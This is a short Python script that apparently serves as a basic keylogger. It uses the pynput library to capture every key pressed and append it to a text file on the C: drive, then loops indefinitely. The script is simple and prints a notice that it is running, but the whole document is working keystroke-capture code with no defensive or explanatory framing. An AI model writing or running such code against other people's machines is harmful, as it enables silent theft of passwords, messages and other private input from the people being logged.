from pynput import keyboard

log_file = "C:/keystrokes.txt"


def on_press(key):
    with open(log_file, "a") as f:
        f.write(str(key) + "\n")

listener = keyboard.Listener(on_press=on_press)

listener.start()

# Keep the program running to continue listening
print("keylogger program executing")
while True:
    pass
